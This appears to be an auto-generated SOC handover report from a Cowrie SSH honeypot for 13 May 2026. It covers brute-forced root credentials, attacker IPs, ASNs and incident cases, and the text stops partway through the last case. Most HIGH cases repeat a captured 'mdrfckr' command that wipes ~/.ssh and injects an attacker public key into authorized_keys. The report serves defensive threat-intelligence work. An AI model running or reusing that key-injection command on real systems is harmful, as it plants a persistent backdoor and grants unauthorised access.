# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T06:52:08Z |
| **Shift Time** | 06:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **296** |
| Confirmed Threats | **241** |
| False Positives Filtered | **55** (18.6%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **22** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **268** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **56** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **16** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 14 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 1 |
| `*1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `123` | 2 |
| `openelec` | 1 |
| `union123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `root` | `openelec` | 1 |
| `root` | `union123` | 1 |
| `root` | `19691969` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `openelec` | `45.66.131.134` | 2026-05-13T04:03:19 |
| `root` | `3245gs5662d34` | `45.66.131.134` | 2026-05-13T04:03:23 |
| `root` | `union123` | `190.181.4.12` | 2026-05-13T04:06:37 |
| `root` | `3245gs5662d34` | `190.181.4.12` | 2026-05-13T04:06:45 |
| `root` | `19691969` | `172.96.182.111` | 2026-05-13T04:10:43 |
| `root` | `3245gs5662d34` | `172.96.182.111` | 2026-05-13T04:10:49 |
| `root` | `qq123456` | `38.137.11.14` | 2026-05-13T04:32:58 |
| `root` | `3245gs5662d34` | `38.137.11.14` | 2026-05-13T04:33:00 |
| `root` | `laura123` | `107.150.119.80` | 2026-05-13T04:34:37 |
| `root` | `3245gs5662d34` | `107.150.119.80` | 2026-05-13T04:34:40 |
| `root` | `Q1w2e3r4t5` | `182.180.59.208` | 2026-05-13T05:29:20 |
| `root` | `3245gs5662d34` | `182.180.59.208` | 2026-05-13T05:29:23 |
| `root` | `Super123!` | `103.49.238.35` | 2026-05-13T06:04:14 |
| `root` | `3245gs5662d34` | `103.49.238.35` | 2026-05-13T06:04:17 |
| `root` | `Admin2026@` | `103.49.238.35` | 2026-05-13T06:16:16 |
| `root` | `zhbjETuyMffoL8F` | `103.49.238.35` | 2026-05-13T06:25:28 |
| `root` | `@1qaz2wsx` | `103.49.238.35` | 2026-05-13T06:28:21 |
| `root` | `ZAQ!@WSXcde3` | `103.49.238.35` | 2026-05-13T06:31:18 |
| `root` | `3edc#EDC` | `103.49.238.35` | 2026-05-13T06:34:20 |
| `root` | `f` | `103.49.238.35` | 2026-05-13T06:40:40 |
| `root` | `!QA@WS3ed` | `103.49.238.35` | 2026-05-13T06:43:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **296** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 56 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 48 | 6 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 48 | 6 | libssh-based |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.66.131.134`, `172.96.182.111`, `182.180.59.208`, `107.150.119.80`, `38.137.11.14`, `190.181.4.12`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **36** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 1 | MEDIUM |
| `AS26210` | AXS Bolivia S. A. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |
| `AS17858` | LG POWERCOMM | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5870e31b2867

| Field | Detail |
|---|---|
| **Source IP** | `45.66.131[.]134` |
| **First Seen** | 2026-05-13 04:03 |
| **Last Seen** | 2026-05-13 04:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:03:19` | `cowrie.session.connect` |
| `2026-05-13 04:03:19` | `cowrie.client.version` |
| `2026-05-13 04:03:19` | `cowrie.client.kex` |
| `2026-05-13 04:03:19` | `cowrie.login.success` |
| `2026-05-13 04:03:20` | `cowrie.session.params` |
| `2026-05-13 04:03:20` | `cowrie.command.input` |
| `2026-05-13 04:03:20` | `cowrie.command.failed` |
| `2026-05-13 04:03:20` | `cowrie.log.closed` |
| `2026-05-13 04:03:20` | `cowrie.session.params` |
| `2026-05-13 04:03:20` | `cowrie.command.input` |
| `2026-05-13 04:03:20` | `cowrie.session.file_download` |
| `2026-05-13 04:03:20` | `cowrie.log.closed` |
| `2026-05-13 04:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.66.131[.]134` to AbuseIPDB if not already reported
- [ ] Block `45.66.131[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32acbeb5828d

| Field | Detail |
|---|---|
| **Source IP** | `45.66.131[.]134` |
| **First Seen** | 2026-05-13 04:03 |
| **Last Seen** | 2026-05-13 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:03:22` | `cowrie.session.connect` |
| `2026-05-13 04:03:22` | `cowrie.client.version` |
| `2026-05-13 04:03:22` | `cowrie.client.kex` |
| `2026-05-13 04:03:23` | `cowrie.login.success` |
| `2026-05-13 04:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.66.131[.]134` to AbuseIPDB if not already reported
- [ ] Block `45.66.131[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af001bedefd2

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-13 04:06 |
| **Last Seen** | 2026-05-13 04:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:06:36` | `cowrie.session.connect` |
| `2026-05-13 04:06:36` | `cowrie.client.version` |
| `2026-05-13 04:06:36` | `cowrie.client.kex` |
| `2026-05-13 04:06:37` | `cowrie.login.success` |
| `2026-05-13 04:06:38` | `cowrie.session.params` |
| `2026-05-13 04:06:38` | `cowrie.command.input` |
| `2026-05-13 04:06:38` | `cowrie.command.failed` |
| `2026-05-13 04:06:39` | `cowrie.log.closed` |
| `2026-05-13 04:06:39` | `cowrie.session.params` |
| `2026-05-13 04:06:39` | `cowrie.command.input` |
| `2026-05-13 04:06:40` | `cowrie.session.file_download` |
| `2026-05-13 04:06:40` | `cowrie.log.closed` |
| `2026-05-13 04:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52e67f6bd789

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-13 04:06 |
| **Last Seen** | 2026-05-13 04:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:06:44` | `cowrie.session.connect` |
| `2026-05-13 04:06:44` | `cowrie.client.version` |
| `2026-05-13 04:06:44` | `cowrie.client.kex` |
| `2026-05-13 04:06:45` | `cowrie.login.success` |
| `2026-05-13 04:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7455fb485aea

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-05-13 04:10 |
| **Last Seen** | 2026-05-13 04:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:10:41` | `cowrie.session.connect` |
| `2026-05-13 04:10:41` | `cowrie.client.version` |
| `2026-05-13 04:10:42` | `cowrie.client.kex` |
| `2026-05-13 04:10:43` | `cowrie.login.success` |
| `2026-05-13 04:10:43` | `cowrie.session.params` |
| `2026-05-13 04:10:43` | `cowrie.command.input` |
| `2026-05-13 04:10:43` | `cowrie.command.failed` |
| `2026-05-13 04:10:43` | `cowrie.log.closed` |
| `2026-05-13 04:10:44` | `cowrie.session.params` |
| `2026-05-13 04:10:44` | `cowrie.command.input` |
| `2026-05-13 04:10:44` | `cowrie.session.file_download` |
| `2026-05-13 04:10:44` | `cowrie.log.closed` |
| `2026-05-13 04:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748a23bae5b3

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-05-13 04:10 |
| **Last Seen** | 2026-05-13 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:10:47` | `cowrie.session.connect` |
| `2026-05-13 04:10:47` | `cowrie.client.version` |
| `2026-05-13 04:10:48` | `cowrie.client.kex` |
| `2026-05-13 04:10:49` | `cowrie.login.success` |
| `2026-05-13 04:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e8723f0e545

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-05-13 04:32 |
| **Last Seen** | 2026-05-13 04:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:32:58` | `cowrie.session.connect` |
| `2026-05-13 04:32:58` | `cowrie.client.version` |
| `2026-05-13 04:32:58` | `cowrie.client.kex` |
| `2026-05-13 04:32:58` | `cowrie.login.success` |
| `2026-05-13 04:32:59` | `cowrie.session.params` |
| `2026-05-13 04:32:59` | `cowrie.command.input` |
| `2026-05-13 04:32:59` | `cowrie.command.failed` |
| `2026-05-13 04:32:59` | `cowrie.log.closed` |
| `2026-05-13 04:32:59` | `cowrie.session.params` |
| `2026-05-13 04:32:59` | `cowrie.command.input` |
| `2026-05-13 04:32:59` | `cowrie.session.file_download` |
| `2026-05-13 04:32:59` | `cowrie.log.closed` |
| `2026-05-13 04:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c05f2ba569

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-05-13 04:33 |
| **Last Seen** | 2026-05-13 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:33:00` | `cowrie.session.connect` |
| `2026-05-13 04:33:00` | `cowrie.client.version` |
| `2026-05-13 04:33:00` | `cowrie.client.kex` |
| `2026-05-13 04:33:00` | `cowrie.login.success` |
| `2026-05-13 04:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f34a821010c

| Field | Detail |
|---|---|
| **Source IP** | `107.150.119[.]80` |
| **First Seen** | 2026-05-13 04:34 |
| **Last Seen** | 2026-05-13 04:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:34:37` | `cowrie.session.connect` |
| `2026-05-13 04:34:37` | `cowrie.client.version` |
| `2026-05-13 04:34:37` | `cowrie.client.kex` |
| `2026-05-13 04:34:37` | `cowrie.login.success` |
| `2026-05-13 04:34:38` | `cowrie.session.params` |
| `2026-05-13 04:34:38` | `cowrie.command.input` |
| `2026-05-13 04:34:38` | `cowrie.command.failed` |
| `2026-05-13 04:34:38` | `cowrie.log.closed` |
| `2026-05-13 04:34:38` | `cowrie.session.params` |
| `2026-05-13 04:34:38` | `cowrie.command.input` |
| `2026-05-13 04:34:38` | `cowrie.session.file_download` |
| `2026-05-13 04:34:38` | `cowrie.log.closed` |
| `2026-05-13 04:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.119[.]80` to AbuseIPDB if not already reported
- [ ] Block `107.150.119[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-056d012d3e86

| Field | Detail |
|---|---|
| **Source IP** | `107.150.119[.]80` |
| **First Seen** | 2026-05-13 04:34 |
| **Last Seen** | 2026-05-13 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 04:34:40` | `cowrie.session.connect` |
| `2026-05-13 04:34:40` | `cowrie.client.version` |
| `2026-05-13 04:34:40` | `cowrie.client.kex` |
| `2026-05-13 04:34:40` | `cowrie.login.success` |
| `2026-05-13 04:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.119[.]80` to AbuseIPDB if not already reported
- [ ] Block `107.150.119[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6cce736d63e

| Field | Detail |
|---|---|
| **Source IP** | `182.180.59[.]208` |
| **First Seen** | 2026-05-13 05:29 |
| **Last Seen** | 2026-05-13 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 05:29:19` | `cowrie.session.connect` |
| `2026-05-13 05:29:19` | `cowrie.client.version` |
| `2026-05-13 05:29:19` | `cowrie.client.kex` |
| `2026-05-13 05:29:20` | `cowrie.login.success` |
| `2026-05-13 05:29:20` | `cowrie.session.params` |
| `2026-05-13 05:29:20` | `cowrie.command.input` |
| `2026-05-13 05:29:20` | `cowrie.command.failed` |
| `2026-05-13 05:29:20` | `cowrie.log.closed` |
| `2026-05-13 05:29:21` | `cowrie.session.params` |
| `2026-05-13 05:29:21` | `cowrie.command.input` |
| `2026-05-13 05:29:21` | `cowrie.session.file_download` |
| `2026-05-13 05:29:21` | `cowrie.log.closed` |
| `2026-05-13 05:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.180.59[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.180.59[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3573995713c

| Field | Detail |
|---|---|
| **Source IP** | `182.180.59[.]208` |
| **First Seen** | 2026-05-13 05:29 |
| **Last Seen** | 2026-05-13 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 05:29:22` | `cowrie.session.connect` |
| `2026-05-13 05:29:22` | `cowrie.client.version` |
| `2026-05-13 05:29:22` | `cowrie.client.kex` |
| `2026-05-13 05:29:23` | `cowrie.login.success` |
| `2026-05-13 05:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.180.59[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.180.59[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e24b138d0df1

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]35` |
| **First Seen** | 2026-05-13 06:04 |
| **Last Seen** | 2026-05-13 06:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
